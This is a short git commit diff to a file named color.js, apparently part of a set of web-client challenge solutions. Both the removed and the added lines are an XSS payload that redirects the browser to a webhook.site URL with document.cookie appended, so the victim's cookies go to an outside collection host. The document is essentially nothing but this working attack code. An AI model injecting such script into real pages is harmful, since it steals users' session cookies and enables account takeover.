a265b558f0d53f053bb38d58639af39df9e68911
tristanqtn <tristan.querton@gmail.com>
2025-02-03 19:30:21 +0100

    zzzz

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,7 +1,3 @@
-// xss.js
-(function () {
-  alert("XSS Triggered!");
-  document.location =
-    "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=" +
-    document.cookie;
-})();
+document.location =
+  "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?flag=" +
+  document.cookie;
